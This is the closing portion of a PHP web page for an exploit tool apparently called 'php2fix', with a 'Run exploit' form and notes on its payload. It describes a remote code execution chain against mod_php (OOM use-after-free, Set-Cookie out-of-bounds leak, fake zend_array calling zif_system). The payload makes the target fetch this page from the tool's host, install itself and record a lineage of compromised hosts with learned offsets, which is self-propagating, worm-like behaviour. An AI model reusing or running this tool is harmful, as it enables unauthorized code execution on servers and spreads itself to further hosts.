  <input type="text" id="cmd" name="cmd" placeholder="empty = install this page + patch php" value="<?= p2f_h($opts['cmd']) ?>">
  <div class="row">
    <label style="text-align:left"><input type="checkbox" name="setMemoryLimit" value="1" <?= $opts['setMemoryLimit'] ? 'checked' : '' ?>> set_memory_limit: also patch the target's PHP (<code>.user.ini</code>: memory_limit=-1)</label>
  </div>
  <div class="row"><button type="submit" name="run" value="1">Run exploit</button></div>
</form>

<div class="note">
  <p><strong>How the payload works.</strong> On success the target runs one
  <code>php -r</code>: it GETs this page as plain PHP
  (<code><?= p2f_h($self) ?>?txt</code>), writes it to
  <code><?= p2f_h($opts['installPath']) ?></code>, writes
  <code>.user.ini</code> next to it, and drops a marker file that this page reads
  back to prove the RCE fired.</p>
  <p><strong>About <code>memory_limit=-1</code>.</strong> It is the right universal
  setting for <em>this tool's own</em> process &mdash; a single run buffers a 33 MB
  body and holds ~150 sockets, so a web request needs unlimited memory and time.
  It is the <em>wrong</em> setting for a host you still want to exploit with this
  chain: the chain <em>needs</em> the request to hit the memory limit (that OOM is
  the use-after-free). With <code>-1</code> nothing ever OOMs and no state is left
  dangling. Remove <code>.user.ini</code> before pointing a copy at its own host.</p>
  <details><summary>notes</summary>
   <p>Target scope: mod_php on stock prefork, Zend MM, <code>file_uploads=On</code>
   and <code>session.upload_progress.enabled=On</code> (php.ini-production). The
   chain: A1 startup OOM &rarr; dangling <code>PS(id)</code> &rarr; B1
   <code>Set-Cookie</code> OOB read (libphp + chunk bases) &rarr; A2 calibrated OOM
   &rarr; B2 fake <code>zend_array</code> with <code>pDestructor=zif_system</code>.</p>
  </details>
</div>
</body>
</html>


<?php
?>

<?php
/* ------------------------------------------------------ dev: ?probe= -----
 * Runs only A1 -> B1 against HOST:PORT and prints what the leak contains.
 * This isolates the HTTP client from the driver's control flow.
 */
?>


<?php
/* P2F-LINEAGE-BEGIN
 * Every copy of this file that is served as `?txt` records one line below, so
 * an installed copy carries the full history of who fixed whom, e.g.
 *   I got fixed by 9f21c3 (http://10.99.0.1:8099/php2fix.php) at 2026-10-24T17:02:11Z
 */

/* P2F-KNOWN
 * Learned build knobs, appended by ?learn= and served by ?txt, one per line:
 *     * v=<version> id=<build-id> z=<zval_ptr_dtor> f=<zif_system>
 *       s=<S_OFF> c=<a2|a2s> src=<host>
 * A PHP_VERSION is not the identity of an offset set: compiler flags, ZTS,
 * debug and patches each move the numbers.  Entries are therefore keyed by a
 * build fingerprint (version+ZTS+debug+arch+libphp size) and the driver tries
 * every known set for a version until one lands.  Nothing is added twice, the
 * built-in table wins, and the knowledge only travels in installed copies.
 */
